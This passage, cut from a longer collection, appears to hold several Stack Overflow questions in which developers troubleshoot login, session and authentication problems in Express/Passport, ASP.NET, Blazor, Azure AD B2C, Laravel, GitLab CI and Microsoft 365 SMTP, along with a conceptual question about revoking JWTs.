    ],
    methods: ['POST', 'PUT', 'GET', 'DELETE'],
    credentials: true,
}));

app.use(session({
    secret: env.SESSION_SECRET,
    cookie: {
        maxAge: 3600000, // 1hr
        httpOnly: true,
        rolling: true,
        secure: false,
    },
    store,
    resave: false,
    saveUninitialized: false,
}));

app.use(router);
</code></pre>
<p>./routes/index.js</p>
<pre><code>import Auth from './auth.js';
import crud from './crud.js';
const router = Router();

router.post('/signup', Auth.signup);
router.post('/login', Auth.login);
router.get('/data', Auth.authMiddleware(['admin', 'basic', 'premium', 'standard']), crud.getData);
export default router;
</code></pre>
<p>./routes/auth.js</p>
<pre><code>const authMiddleware = (permittedRoles) =&gt; async (req, res, next) =&gt; {
    try {
        if (permittedRoles.indexOf(req.session.user.role) &gt; -1) {
            next();
        } else {
            await req.session.destroy();
            await res.clearCookie('connect.sid');
            res.status(401).json('forbidden');
        }
    } catch (err) {
        await req.session.destroy();
        await res.clearCookie('connect.sid');
        await res.status(401).json('Session Expired. Log in again.');
    }
};

const login = async (req, res) =&gt; {
    try {
        const maybeUser = await UserController.getUser(req.body.email);
        if (maybeUser &amp;&amp; await bcrypt.compare(req.body.password, maybeUser.password)) {
            req.session.user = { email: maybeUser.email, role: maybeUser.role };
            req.session.save(); // when I console.log, it works, you see the additional email and role attributes in .user property
            res.status(201).json({ success: `Welcome, ${req.body.email}`});
        } else {
            res.status(400).json('Invalid Email or Password');
        }
    } catch (err) {
        res.status(500).json('Something went wrong on our side. Contact an administrator.');
    }
};

const signup = async (req, res) =&gt; {
    try {
        const { email } = req.body;
        const password = await bcrypt.hash(req.body.password, 15).then((hash) =&gt; hash);
        const resp = await UserController.addUser({ email, password });
        if (resp.success &amp;&amp; !resp.error) {
            res.status(201).json({ success: 'User Created.' });
        } else {
            res.status(400).json('Unable to create account.');
        }
    } catch (err) {
        // res.status(500).json(err);
        res.status(500).json('Something went wrong on our side. Contact an administrator.');
    }
};

</code></pre>
<p>./routes/crud.js</p>
<pre><code>const getData = (req, res) =&gt; {
    console.log(req.session); // session should include email and role properties but doesn't
    ....
}
</code></pre>
<p>In my nextJS UI, I make the API call like this:</p>
<pre><code>const response = await fetch('localhost:8080/signup', {
            method: 'POST',
            body: await statesToFormData(),
        });

...

const response = await fetch('localhost:8080/login', {
            method: 'POST',
            body: await statesToFormData(),
        });

const response = await fetch('localhost:8080/data', {
            method: 'GET',
            credentials: 'include',
        });
</code></pre>
<p><strong>Edit</strong>: I solved my problem. <code>req.session(...)</code> takes in a callback, so my login endpoint now looks like this:</p>
<pre><code>const login = async (req, res) =&gt; {
    ...
    if (...) {
     req.session.user = { email: maybeUser.email, role: maybeUser.role };
     req.session.save((err) =&gt; {
                if (err) {
                   res.status(500).json(...);
                } else {
                    res.status(201).json(...);
                }
            });
    } else { ... }
    ...
};
</code></pre>
"
"<p>i'm new in this world, so if I say bad things, psl tell me.
I'm trying to run a simple partial login that I can call on any page I want
i'm not using a /shared/_loginPartial because i didn't found something who can explain me how to do it.
I'm using a simple controller and i just recall it with $(#).load(&quot;Page url&quot;);
Can someone explain me how to do or help me find some video or page ?!</p>
<p>AccountController.cs</p>
<pre><code>[HttpGet]
[AllowAnonymous]
public IActionResult LoginPartial()
{
   return PartialView();
}

[HttpPost]
[AllowAnonymous]
public async Task&lt;IActionResult&gt; LoginPartial(string returnUrl = null)
{
    returnUrl ??= Url.Content(&quot;~/&quot;);

    ExternalLogins = (await _signInManager.GetExternalAuthenticationSchemesAsync()).ToList();

    if (ModelState.IsValid)
            {
                // This doesn't count login failures towards account lockout
                // To enable password failures to trigger account lockout, set lockoutOnFailure: true
                var result = await _signInManager.PasswordSignInAsync(Input.Email, Input.Password, Inpu.RememberMe, lockoutOnFailure: false);
                if (result.Succeeded)
                {
                    _logger.LogInformation(&quot;User logged in.&quot;);
                    return LocalRedirect(returnUrl);
                }
                if (result.RequiresTwoFactor)
                {
                    return RedirectToPage(&quot;./LoginWith2fa&quot;, new { ReturnUrl = returnUrl, RememberMe = Input.RememberMe });
                }
                if (result.IsLockedOut)
                {
                    _logger.LogWarning(&quot;User account locked out.&quot;);
                    return RedirectToPage(&quot;./Lockout&quot;);
                }
                else
                {
                    ModelState.AddModelError(string.Empty, &quot;Invalid login attempt.&quot;);
                    return PartialView();
                }
            }

    return PartialView();


}
</code></pre>
<p>Ex. Index.cshtml</p>
<pre><code>&lt;div id=&quot;partialZone&quot;&gt;
&lt;/div&gt;

&lt;script&gt;
      $('#partialZone').load(&quot;/Account/LoginPartial&quot;);
&lt;/script&gt;
</code></pre>
<p>thanks in advance for the reply.
Please don't be mean, I'm new and learning now</p>
"
"<p>I have big problems in using AuthenticationState in Blazor 8.0 Wasm (Hosted).
The problem is that after I log in, the AuthenticationState is not refreshed and the DefaultAuthorizationService.Authorize method gets old ClaimPrincipal data.</p>
<p>All the services are registered in DI container.</p>
<p>I have implemented custom AuthenticationStateProvider like this:</p>
<pre><code>public class PersistentAuthenticationStateProvider : AuthenticationStateProvider
{
    private readonly UserInfoProvider _userInfoProvider;
    private readonly ILogger&lt;PersistentAuthenticationStateProvider&gt; _logger;
    private ClaimsPrincipal UnauthorizedPrincipal =&gt; new ClaimsPrincipal(new 
            ClaimsIdentity(new List&lt;Claim&gt;(){new Claim(ClaimTypes.Name, &quot;Anonymous&quot;)}));

    public PersistentAuthenticationStateProvider(UserInfoProvider userInfoProvider, 
           ILogger&lt;PersistentAuthenticationStateProvider&gt; logger)
    {
        _userInfoProvider = userInfoProvider;
        _logger = logger;
    }

    public override Task&lt;AuthenticationState&gt; GetAuthenticationStateAsync()
    {
        var claimsPrincipal = UnauthorizedPrincipal;
        var info = _userInfoProvider.GetCurrentUserInfo();
        if (info != null)
        {
            claimsPrincipal = new ClaimsPrincipal(new ClaimsIdentity(
                info.UserClaims.Select(x =&gt; new Claim(x.ClaimType, x.ClaimValue)),
                authenticationType: &quot;PersistentAuthenticationStateProvider&quot;));
        }

        var stateTask = Task.FromResult(new AuthenticationState(claimsPrincipal));
        return stateTask;
    }

    public void NotifyUserHasChanged()
    {
        NotifyAuthenticationStateChanged(GetAuthenticationStateAsync());
    }
}
</code></pre>
<p>On User login I call NotifyUserHasChanged() method on an instance of PersistentAuthenticationStateProvider, but nothing happens.</p>
<p>I have put a breakpoint in the AuthorizeView.OnParameterSetAsync where it is getting the AuthenticationState, and this method is not executed when NotifyAuthenticationStateChanged is called.</p>
<p>My workflow for user authentication is:</p>
<ol>
<li>At the startup, the framework checks if the user is logged in, if not, it will redirect to LoginPage</li>
<li>User enters username and password and tries to login</li>
<li>This makes a Rest request to the api endpoint and returns token. This token is saved in local storage.</li>
<li>Then I make a request to get UserInfo containing user claims.</li>
<li>If this success, i store it into local storage and NotifyAuthenticationStateChanged.</li>
<li>I use NavigationManager to navigate to HomePAge that has [Authorize] attribute.</li>
<li>The framework calls AuthorizeView.OnParameterSetAsync() and there is a call to await AuthenticationState, this state returns old data.</li>
</ol>
<p>But if I close the browser and restart it, it will find the user data stored in localstorage and the user will correctly be authorized.</p>
<p>Also if i log-out the user, I clear up the local storage and NotifyAuthenticationStateChanged, it will correctly be unauthorized.</p>
<p><strong>NOTE: It works if I navigate using &quot;forceLoad:true&quot;</strong></p>
<p>I need help to find what I'm doing wrong?
Please help</p>
<p>Thanks</p>
"
"<p>I have set up Forgot Password functionality on a custom unified sign-in/sign-up screen (custom policy). It works perfectly fine, but asks the user for a new password on two screens instead of one. The flow is as follows:</p>
<ol>
<li>User clicks &quot;Forgot Your Password&quot;</li>
<li>The flow asks for their e-mail address</li>
<li>Once e-mail address is entered and they enter a verification code, they are taken to a screen which asks for a new password (and confirmation)</li>
<li>They click continue and they AGAIN land on the screen that asks for their new password (and confirmation)</li>
<li>Regardless, they enter a new password and continue. All goes well. Password has changed</li>
</ol>
<p><a href=""https://i.stack.imgur.com/XBoqF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XBoqF.png"" alt=""choose new password screen"" /></a></p>
<p>They should only be asked once for a new password (and confirmation). What have I done wrong?</p>
<p>I followed the instructions in the link <a href=""https://learn.microsoft.com/en-us/azure/active-directory-b2c/add-password-reset-policy?pivots=b2c-custom-policy"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/azure/active-directory-b2c/add-password-reset-policy?pivots=b2c-custom-policy</a></p>
<p><strong>Update: Here is the UserJourney and SubJourneys elements of the policy. The rest is too sensitive to post</strong></p>
<pre><code>    &lt;TrustFrameworkPolicy&gt;

&lt;UserJourneys&gt;

    &lt;UserJourney Id=&quot;CustomSignUpSignIn&quot;&gt;
      &lt;OrchestrationSteps&gt;
        &lt;OrchestrationStep Order=&quot;1&quot; Type=&quot;CombinedSignInAndSignUp&quot; ContentDefinitionReferenceId=&quot;api.signuporsignin&quot;&gt;
          &lt;ClaimsProviderSelections&gt;
            &lt;ClaimsProviderSelection TargetClaimsExchangeId=&quot;PasswordResetUsingEmailAddressExchange&quot; /&gt;
            &lt;ClaimsProviderSelection ValidationClaimsExchangeId=&quot;LocalAccountSigninEmailExchange&quot; /&gt;
            &lt;ClaimsProviderSelection TargetClaimsExchangeId=&quot;ForgotPasswordExchange&quot; /&gt;
          &lt;/ClaimsProviderSelections&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;LocalAccountSigninEmailExchange&quot; TechnicalProfileReferenceId=&quot;SelfAsserted-LocalAccountSignin-Email&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
        &lt;OrchestrationStep Order=&quot;2&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;true&quot;&gt;
              &lt;Value&gt;objectId&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;ForgotPasswordExchange&quot; TechnicalProfileReferenceId=&quot;ForgotPassword&quot; /&gt;
            &lt;ClaimsExchange Id=&quot;SignUpWithLogonEmailExchange&quot; TechnicalProfileReferenceId=&quot;LocalAccountSignUpWithLogonEmail&quot; /&gt;
            &lt;ClaimsExchange Id=&quot;PasswordResetUsingEmailAddressExchange&quot; TechnicalProfileReferenceId=&quot;LocalAccountDiscoveryUsingEmailAddress&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
        &lt;OrchestrationStep Order=&quot;3&quot; Type=&quot;InvokeSubJourney&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;false&quot;&gt;
              &lt;Value&gt;isForgotPassword&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;JourneyList&gt;
            &lt;Candidate SubJourneyReferenceId=&quot;PasswordReset&quot; /&gt;
          &lt;/JourneyList&gt;
        &lt;/OrchestrationStep&gt;

        &lt;OrchestrationStep Order=&quot;4&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;false&quot;&gt;
              &lt;Value&gt;isPasswordResetFlow&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;NewCredentials&quot; TechnicalProfileReferenceId=&quot;LocalAccountWritePasswordUsingObjectId&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;

        &lt;OrchestrationStep Order=&quot;5&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;true&quot;&gt;
              &lt;Value&gt;objectId&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;SelfAsserted-Social&quot; TechnicalProfileReferenceId=&quot;SelfAsserted-Social&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;

        &lt;OrchestrationStep Order=&quot;6&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;AADUserReadWithObjectId&quot; TechnicalProfileReferenceId=&quot;AAD-UserReadUsingObjectId&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;

        &lt;OrchestrationStep Order=&quot;7&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;true&quot;&gt;
              &lt;Value&gt;isActiveMFASession&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;PhoneFactor-Verify&quot; TechnicalProfileReferenceId=&quot;PhoneFactor-InputOrVerify&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;

        &lt;OrchestrationStep Order=&quot;8&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;false&quot;&gt;
              &lt;Value&gt;newPhoneNumberEntered&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;AADUserWriteWithObjectId&quot; TechnicalProfileReferenceId=&quot;AAD-UserWritePhoneNumberUsingObjectId&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
        &lt;OrchestrationStep Order=&quot;9&quot; Type=&quot;SendClaims&quot; CpimIssuerTechnicalProfileReferenceId=&quot;JwtIssuer&quot; /&gt;
      &lt;/OrchestrationSteps&gt;
      &lt;ClientDefinition ReferenceId=&quot;DefaultWeb&quot; /&gt;
    &lt;/UserJourney&gt;
    &lt;UserJourney Id=&quot;UserInfoJourney&quot; DefaultCpimIssuerTechnicalProfileReferenceId=&quot;UserInfoIssuer&quot;&gt;
      &lt;Authorization&gt;
        &lt;AuthorizationTechnicalProfiles&gt;
          &lt;AuthorizationTechnicalProfile ReferenceId=&quot;UserInfoAuthorization&quot; /&gt;
        &lt;/AuthorizationTechnicalProfiles&gt;
      &lt;/Authorization&gt;
      &lt;OrchestrationSteps&gt;
        &lt;OrchestrationStep Order=&quot;1&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;Preconditions&gt;
            &lt;Precondition Type=&quot;ClaimsExist&quot; ExecuteActionsIf=&quot;false&quot;&gt;
              &lt;Value&gt;objectId&lt;/Value&gt;
              &lt;Action&gt;SkipThisOrchestrationStep&lt;/Action&gt;
            &lt;/Precondition&gt;
          &lt;/Preconditions&gt;
          &lt;ClaimsExchanges UserIdentity=&quot;false&quot;&gt;
            &lt;ClaimsExchange Id=&quot;AADUserReadWithObjectId&quot; TechnicalProfileReferenceId=&quot;AAD-UserReadUsingObjectId&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
        &lt;OrchestrationStep Order=&quot;2&quot; Type=&quot;SendClaims&quot; CpimIssuerTechnicalProfileReferenceId=&quot;UserInfoIssuer&quot; /&gt;
      &lt;/OrchestrationSteps&gt;
    &lt;/UserJourney&gt;
  &lt;/UserJourneys&gt;
  &lt;SubJourneys&gt;
    &lt;SubJourney Id=&quot;PasswordReset&quot; Type=&quot;Call&quot;&gt;
      &lt;OrchestrationSteps&gt;
        &lt;!-- Validate user's email address. --&gt;
        &lt;OrchestrationStep Order=&quot;1&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;PasswordResetUsingEmailAddressExchange&quot; TechnicalProfileReferenceId=&quot;LocalAccountDiscoveryUsingEmailAddress&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
        &lt;!-- Collect and persist a new password. --&gt;
        &lt;OrchestrationStep Order=&quot;2&quot; Type=&quot;ClaimsExchange&quot;&gt;
          &lt;ClaimsExchanges&gt;
            &lt;ClaimsExchange Id=&quot;NewCredentials&quot; TechnicalProfileReferenceId=&quot;LocalAccountWritePasswordUsingObjectId&quot; /&gt;
          &lt;/ClaimsExchanges&gt;
        &lt;/OrchestrationStep&gt;
      &lt;/OrchestrationSteps&gt;
    &lt;/SubJourney&gt;
  &lt;/SubJourneys&gt;
&lt;/TrustFrameworkPolicy&gt;
</code></pre>
"
"<p>I'm trying to initialize Metatrader 5 with Python and have it login. All seems to work fine. However, after it's launched metatrader and logged in to the trader account, Metatrader crashes and shuts down.</p>
<p>Am I missing something?</p>
<pre><code>import MetaTrader5 as mt5

if not mt5.initialize(login=12345, server=&quot;Server_Name&quot;,password=&quot;123456&quot;):
    print(&quot;initialize() failed, error code =&quot;,mt5.last_error())
</code></pre>
"
"<p>In my current gitlab repo (&quot;gneh&quot;) CI, I am trying to use a docker image from another gitlab repo (&quot;ml-v3&quot;)'s container registry.
Following <a href=""https://stackoverflow.com/a/70293080/19918448"">this explaination</a>, as well as gitlab documentation, I have set the <code>DOCKER_AUTH_CONFIG</code> CI variable : first to &quot;my_username:my_password&quot; then to &quot;oauth2accesstoken:my_token&quot; (both converted to base64). But in all cases, I get the following error when the pipeline runs:</p>
<pre><code>ERROR: Job failed: failed to pull image &quot;registry.gitlab.com/magyar_57/ml-v3:3.10&quot; with specified policies [always]: Error response from daemon: Get https://registry.gitlab.com/v2/magyar_57/ml-v3/manifests/3.10: unauthorized: HTTP Basic: Access denied. The provided password or token is incorrect or your account has 2FA enabled and you must use a personal access token instead of a password. See https://gitlab.com/help/user/profile/account/two_factor_authentication#troubleshooting (manager.go:237:0s)
</code></pre>
<p>2FA is not enabled on my account. And if it was, the access token should work.</p>
<p>I tried with a public repo, and the image is pulled correctly, so the issue is for sure at authentication. Any idea why I cannot login ?</p>
"
"<p>I have written several C# apps that used the SmtpClient. they have been running for years. this week they all stopped working and are throwing the following exception:</p>
<pre><code>System.Net.Mail.SmtpException
  HResult=0x80131500
  Message=The SMTP server requires a secure connection or the client was not authenticated. The server response was: 5.7.57 Client not authenticated to send mail. Error: 535 5.7.139 Authentication unsuccessful, the request did not meet the criteria to be authenticated successfully. Contact your administrator.   Source=System.Net.Mail
</code></pre>
<p>I am not a systems person, but a lowly programmer. I do manage my own Microsoft 365 account and Azure accounts.</p>
<p>in the c# app i am not using default credentials:</p>
<pre><code>    using System.Net.Mail;
...
           client.Credentials = new System.Net.NetworkCredential(FROM, PW, DOMAIN);
</code></pre>
<p>In the MS 365 Admin Center when i select Authenticated SMTP i get the following error:</p>
<pre><code>Cannot process argument transformation on parameter 'Identity'. Cannot convert value &quot;&quot; to type &quot;Microsoft.Exchange.Configuration.Tasks.RecipientIdParameter&quot;. Error: &quot;Parameter values of type Microsoft.Exchange.Configuration.Tasks.RecipientIdParameter can't be empty. Specify a value, and try again. Parameter name: identity&quot;
</code></pre>
<p>when i exit my active user and enter it again, all the &quot;Manage email apps&quot; are checked. but i still get the error above and can't send email in my app.</p>
<p>what do i need to do to correct this?</p>
"
"<p>I've integrated amplify auth into my application and the user is successfully logging in and out of the application, I've created a screen in my app that would let the user to connect his existing account to their social accounts (which can then be used log-in if they choose to logout).</p>
<p>I tried using amplify's signInWithRedirect but it throws an exception saying 'There is already a signed in user'</p>
"
"<p>I am testing my Custom guard:</p>
<pre class=""lang-php prettyprint-override""><code>namespace Tests\Feature\Extensions;

use App\Models\Customer;
use App\Extensions\CustomerUser;

use Illuminate\Http\Request;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Auth;

use Mockery;
use Tests\TestCase;

class CustomGuardTest extends TestCase
{
    use RefreshDatabase;
    public function testAuthSuccess(): void
    {
        // Password is by default 1234
        $customer = CustomerUser::factory()-&gt;create();

        $request = $this-&gt;app-&gt;make('request');

        $guard = new CustomGuard('customer_session', Auth::createUserProvider('customer'), $request);
        $authenticated = $guard-&gt;attempt(['email' =&gt; $customer-&gt;email, 'password' =&gt; '1234', 'user_id' =&gt; $customer-&gt;user_id]);

        $this-&gt;assertTrue($authenticated);
    }
}

</code></pre>
<p>But upon test I get the error:</p>
<pre><code>There was 1 error:

1) Tests\Feature\Extensions\CustomerGuardTest::testAuthSuccess
RuntimeException: Session store not set on request.

/var/www/html/vendor/laravel/framework/src/Illuminate/Http/Request.php:560
/var/www/html/app/Extensions/CustomerGuard.php:13
/var/www/html/tests/Feature/Extensions/CustomerGuardTest.php:25
/var/www/html/vendor/laravel/framework/src/Illuminate/Foundation/Testing/TestCase.php:61

</code></pre>
<p>And I try to test that my guard will authenticate with my email,password and user_id whislt if Not provided user won't be authenticated.</p>
<p>The guard is as follows:</p>
<pre><code>namespace App\Extensions;

use Illuminate\Auth\SessionGuard;
use Illuminate\Contracts\Auth\UserProvider;
use Illuminate\Http\Request;

class CustomGuard extends SessionGuard
{
    public function __construct($name, UserProvider $provider, Request $request)
    {
        parent::__construct($name, $provider, $request-&gt;session() ,$request);
    }

    public function attempt(array $credentials = [], $remember = false)
    {
        $user = $this-&gt;provider-&gt;retrieveByCredentials($credentials);
        // Check if the retrieved user exists and the password is correct
        if ($user &amp;&amp; $this-&gt;provider-&gt;validateCredentials($user, $credentials)) {
            // Log in the user
            $this-&gt;login($user, $remember);
            return true;
        }

        return false;
    }
}
</code></pre>
<p>Whereas my provider is:</p>
<pre><code>namespace App\Extensions;

use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;
class CustomeProvider extends EloquentUserProvider
{
    public function retrieveByCredentials(array $credentials)
    {
        if (empty($credentials) ||
            (count($credentials) === 1 &amp;&amp; array_key_exists('password', $credentials))) {
            return null;
        }
        // Retrieve the customer based on the email and user_id
        return $this-&gt;createModel()-&gt;newQuery()
            -&gt;where('email', $credentials['email'])
            -&gt;where('user_id', $credentials['user_id'])
            -&gt;first();
    }

    public function validateCredentials(UserContract $customer, array $credentials)
    {
        if(isset($credentials['user_id']) &amp;&amp; (int)$customer-&gt;user_id==$credentials['user_id']){
            return parent::validateCredentials($customer,$credentials);
        }
        return false;
    }
}
</code></pre>
<p>Do you know How I can fix the error? I want to ensure that my guard works so I can be sure that I can apply them upon my routes.</p>
"
"<p>I'm trying to understand a part of the <em>general philosophy</em> behind JWTs.</p>
<p>I've read in several articles around the internet that <strong>JWTs are irrevocable by design</strong>. In other words, once a valid token is issued, there is no way to revoke it other than just waiting for it to expire, unless I keep some sort of state on the server which would seem to defeat the #1 benefit of using JWTs. Please correct me if this is a faulty premise for my understanding.</p>
<p>What I'm trying to understand is <strong>how can this possibly be considered an acceptable tradeoff?</strong> If someone managed to get a passkey to my house, I'd never just be like &quot;Well, you have 5 minutes until the code expires to poke around as much as you want and grab what you can.&quot; The idea is laughable, I'd want the person's access revoked <em>immediately</em>. But isn't that how we're treating user data with JWTs? I'm hoping that I'm grossly misunderstanding this!</p>
<p>I can never guarantee that a malicious party won't somehow manage to get a user's JWT due to mistakes on their part, but it seems like it would be a standard expectation for me to offer my users the ability to at least log themselves out everywhere (revoking access for all unexpired tokens) so that malicious party's access can be blocked immediately.</p>
<p>So here are my thought questions:</p>
<ul>
<li>If this tradeoff is indeed considered acceptable, why?</li>
<li>Doesn't this make JWTs a complete no-go for stricter security requirements like HIPAA or are there approaches for getting around this problem with JWTs? If there are solutions, I'd love to see some links to articles that dive into possible implementations. Are there still advantages to using JWTs with potential workaround to this problem versus good old-fashioned server-side session storage, and what are the advantages?</li>
</ul>
"
"<p>So, I have a simple Node Express server and I am handling authentication with Passport.js. I am struggling when trying to make it work correctly.</p>
<p>Here's the setup:</p>
<ul>
<li><p>I have a React frontend where users can input their email and password in a form. (Shouldn't be the problem, as I tried to make the same POST request from an html and script file, got the same error).</p>
</li>
<li><p>Upon form submission, the application should send a POST request to the server (http://localhost:8080/login) with the email and password data.</p>
</li>
<li><p>The frontend application is using Axios to send the POST request to the backend. (Tried fetch, same response).</p>
</li>
<li><p>The server should:</p>
<ul>
<li><p>Receive email and password.</p>
</li>
<li><p>Verify these credentials are OK.</p>
</li>
<li><p>Serialize/deserialize user.</p>
</li>
<li><p>Redirect to &quot;/auth/jwt&quot; which is protected by passportAuth middleware. (&quot;/auth/jwt&quot; is not implemented yet, so this route just gets de req and sends a 200 status, it does nothing else).</p>
</li>
<li><p>And here remains the problem. In the passportAuth middleware, which is essentialy, &quot;req.isAuthenticated()&quot;, returning false UNLESS I send the email and password from postman, which makes everything very frustrating.</p>
</li>
<li><p>Sessions are getting stored in MongoDB and the key &quot;passport&quot; does exist with user's _id, as expected, but I do not know why isn't it working.</p>
</li>
</ul>
</li>
<li><p>My thoughts:</p>
<ul>
<li><p>Shoudn't be cors problem, as I set app.use(cors()).</p>
</li>
<li><p>Client request should be fine.</p>
</li>
<li><p>Web app and postman's request are the same, just email and password.</p>
</li>
<li><p>Headers problem? Tried different configs, still not working.</p>
</li>
</ul>
</li>
</ul>
<p>React Frontend:</p>
<pre><code>...
const userData = { email, password };
const config = { headers: { &quot;content-type&quot;: &quot;application/json&quot; }};
const res = await axios.post(&quot;http://localhost:8080/login&quot;, userData, config);
console.log(res);
...
</code></pre>
<p>Server.js</p>
<pre><code>const initializePassport = require(&quot;./passport/local&quot;);

const sessionConfig = {
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false, // Resave and saveUninitialized: tried false and true.
    cookie: {
      secure: false,
      httpOnly: false,
    },

    store: new mongoStore({
      mongoUrl: URI_CLOUD_CONNECTION,
      ttl: 60 * 30,
      expires: 60 * 30,
      autoRemove: &quot;native&quot;,
    }),
  }

  try {
    await mongoose.connect(URI_CLOUD_CONNECTION);

    initializePassport(passport); // local.js
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));
    app.use(cookieParser(SESSION_SECRET));
    app.use(cors());
    app.use(expressSession(sessionConfig)); // express-session

    // Passport initialization
    app.use(passport.initialize());
    app.use(passport.session());
</code></pre>
<p>Login route:</p>
<pre><code>// &quot;/login&quot;
router.route(&quot;/&quot;).post(PassportController.login);
</code></pre>
<p>PassportController:</p>
<pre><code>const passport = require(&quot;passport&quot;);

const login = passport.authenticate(&quot;login&quot;, {
  successRedirect: &quot;/auth/jwt&quot;,
})
</code></pre>
<p>&quot;/auth/jwt&quot; route:</p>
<pre><code>const passportAuth = require(&quot;../../middlewares/passportAuth&quot;);
const JwtController = require(&quot;../../controllers/authControllers/jwt-controller&quot;);

// &quot;/auth/jwt&quot;
router.get(&quot;/&quot;, passportAuth, JwtController.generateTokenAndRedirect); // This JwtController just sends status 200.
</code></pre>
<p>PassportAuth middleware:</p>
<pre><code>module.exports = (req, res, next) =&gt; {
  if (!req.isAuthenticated()) {
    logger.error(&quot;User not authenticated by passport!&quot;);
    return res.sendStatus(401);
  }

  console.log(&quot;Passport ID en session: &quot;, req.session.passport);
  logger.info(&quot;PassportAuth authenticated.&quot;);

  next();
};
</code></pre>
<p>Local.js (passport main logic):</p>
<pre><code>const LocalStrategy = require(&quot;passport-local&quot;).Strategy;

module.exports = (passport) =&gt; {
  const authenticateUser = async (req, email, password, done) =&gt; {
    try {
      const user = await userModel.getUserByEmail(email);

      if (!user) {
        const errorMessage = { message: &quot;Requested user does not exist.&quot; };
        return done(errorMessage, false);
      }

      const isPasswordValid = await userModel.isPasswordValid(email, password);

      if (!isPasswordValid) {
        const errorMessage = { message: &quot;Wrong password.&quot; };
        return done(errorMessage, false);
      }

      done(null, user); // This works just fine.
    } catch (error) {
      logger.error(&quot;Error in local.js.&quot;, error?.message);
      return done(error);
    }
  };


  passport.use(&quot;login&quot;, new LocalStrategy({
    usernameField: &quot;email&quot;,
    passwordField: &quot;password&quot;,
    passReqToCallback: true,
  }, authenticateUser));


  passport.serializeUser((user, done) =&gt; {
    console.log(&quot;Serializing user (only _id)...&quot;, user._id.toString());
    return done(null, user._id.toString());
  });

  passport.deserializeUser(async (_id, done) =&gt; {
    console.log(&quot;Deserialize userId: &quot;, _id);
    const user = await userModel.findById(_id);
    const userData = {
      _id: user._id.toString(),
      email: user.email,
      firstname: user.firstname,
      lastname: user.lastname,
    }
    
    done(null, userData);
  });
};
</code></pre>
<p>It is in passportAuth &quot;isAuthenticated()&quot; where I have this issue with postman and web app. When using postman, it does work and execute next() function. But when requesting from client, it doesn't.<br />
I am losing my mind as I do not understand what is the issue.</p>
<p>Steps I console.logged:</p>
<p>When hiting login:</p>
<ul>
<li><p>Email and password are valid.</p>
</li>
<li><p>Serializing user... (_id)</p>
</li>
<li><p>Error User is not authenticated by passport!</p>
</li>
</ul>
<p>When trying with postman...</p>
<ul>
<li><p>Email and password are valid.</p>
</li>
<li><p>Serializing user... (_id)</p>
</li>
<li><p>Deserializing user... (same _id)</p>
</li>
<li><p>Passport ID in session = { user: &quot;(_id number)&quot; }</p>
</li>
<li><p>Passport authenticated</p>
</li>
<li><p>Sending status 200 OK.</p>
</li>
</ul>
"
